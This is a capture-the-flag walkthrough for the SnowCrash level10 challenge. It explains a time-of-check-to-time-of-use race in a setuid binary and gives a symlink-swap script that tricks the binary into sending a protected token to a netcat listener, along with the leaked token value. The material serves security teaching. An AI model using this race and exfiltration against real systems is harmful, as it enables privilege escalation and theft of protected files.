# LEVEL10

## 1. Inspect The Home Directory

```bash
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
level10@SnowCrash:~$ ./level10 
./level10 file host
	sends file to host if you have access to it
level10@SnowCrash:~$ cat token 
cat: token: Permission denied
level10@SnowCrash:~$ ./level10 token 
./level10 file host
	sends file to host if you have access to it
level10@SnowCrash:~$ ./level10 token test
You don't have access to token
```

The binary requires two arguments a `file` to send and a `host` to send to.
The file `token` is owned and only readable by `flag10`.
The binary first checks the user’s permission before attempting to send the file.

## 2. Analyze The Binary

```bash
level10@SnowCrash:~$ strings ./level10 
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
socket
fflush
exit
htons
connect
puts
__stack_chk_fail
printf
__errno_location
read
stdout
inet_addr
open
access
strerror
__libc_start_main
write
GLIBC_2.4
GLIBC_2.0
PTRh
UWVS
[^_]
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 .. 
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. 
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
;*2$"
[...]
```

Three important elements stand out:

```
open
access
Connecting to %s:6969 .. 
```

`Connecting to %s:6969 ..`, the binary establishes a TCP connection on port 6969.
`access` and `open` the binary checks file permisions with `access()` and later opens the file with `open()`.

This behavior reveals a TOCTOU vulnerability (Time Of Check To Time Of Use).
The program first checks access rights on the path, and later uses that path when opening the file.
If the file is swapped between those two moments (for example via a symbolic link), the binary may end up opening a different file than the one it verified, leaking protected data.

**Explanation:**
>- `strings`		: displays printable strings from a binary file.

## 3.a Listening From The Host Machine

On the host PC, start a listener:

```bash
host@pc:> nc -l 6969

```

Any data transmitted by the binary will appear here.

**Explanation:**
>- `nc` 				: netcat, a tool to read and write data across networks.
>- `-l` 				: listen mode, acting as a server.
>- `6969` 				: port to listen to.

## 3.b Listening Form The VM

It is also possible to stay entirely within the VM by opening another terminal session:

```bash
host@pc:> ssh -p 4243 level10@127.0.0.1
	   _____                      _____               _     
	  / ____|                    / ____|             | |    
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          10.0.2.15 
level10@127.0.0.1's password: 
level10@SnowCrash:~$ nc -l 6969
```

**Explanation:**
>- `ssh HOST`			: connects to a remote host via SSH.
>- `-p 4243`			: specifies the SSH port number to use.

>- `nc` 				: netcat, a tool to read and write data across networks.
>- `-l` 				: listen mode, making the nc a host.
>- `6969` 				: port to listen to.

## 4.a Explain The TOCTOU Vulnerability Exploit

The TOCTOU vulnerability can now be exploited.
The idea is to trick the binary into checking access on a harmless file, then replacing it with a symlink to `~/token` before the file is actually opened.

```bash
level10@SnowCrash:~$ cat << EOF > /tmp/script.sh
> touch /tmp/tmp
> ln -sf /tmp/tmp /tmp/exploit
> ./level10 /tmp/exploit ADDRESS &
> ln -sf ~/token /tmp/exploit
> EOF
level10@SnowCrash:~$ sh /tmp/script.sh
```

**Breakdown of the exploit:**
- `touch /tmp/tmp` 							: Creates an empty temporary file.
- `ln -sf /tmp/tmp /tmp/exploit` 			: Makes `/tmp/exploit` point to the temporary file.
- ` ./level10 /tmp/exploit ADDRESS &` 		: Launches the binary, which checks access on `/tmp/exploit`. Since it points to `/tmp/tmp`, the check succeeds.
- `ln -sf ~/token /tmp/exploit` 			: Before the binary calls `open()`, the symlink is changed to point to the protected `token`.

This race condition ensures the binary checks one file, but actually opens another — a textbook TOCTOU attack.

**Explanation:**
>- `cat << EOF > file`	: creates a file and writes everything until `EOF` into it.

>- `touch` 				: creates a file

>- `ln TARGET LINK`		: creates link from `LINK` to `TARGET`.
>- `-sf`				: forces the creation of a symbolic link from `LINK` to `TARGET`.

>- `CMD1 & CMD2` 		: runs a `CMD1` in the background, allowing the `CMD2` to execute immediately in the foreground.


## 4.b Sending To The Host Machine

To send the result of the attack to the host machine, replace `ADDRESS` with the host's IP address.  
The IP can be found using `ip a | grep inet` or `ifconfig`, and typically looks like `192.168.xxx.xxx`.

```bash
host@pc:> ip a | grep 192
    inet 192.168.102.1/24 brd 192.168.102.255 scope global virbr0
host@pc:> ifconfig | grep 192
    	inet 192.168.102.1  netmask 255.255.255.0  broadcast 192.168.102.255
```

Here, the host IP address is:
```
192.168.102.1
```

## 4.c Sending To The VM

To send directly in the VM, it's just need to replace `ADDRESS` by `127.0.0.1`, the localhost.


## 5. Receive The File

The content of token is now received through the netcat listener:

```bash
host@pc:> nc -l 6969
.*( )*.
woupa2yuojeeaaed06riuj63c
```

## 6. Get The Flag

```bash
> su flag10
Password: 
Don't forget to launch getflag !

> getflag
Check flag.Here is your token : XXX
```
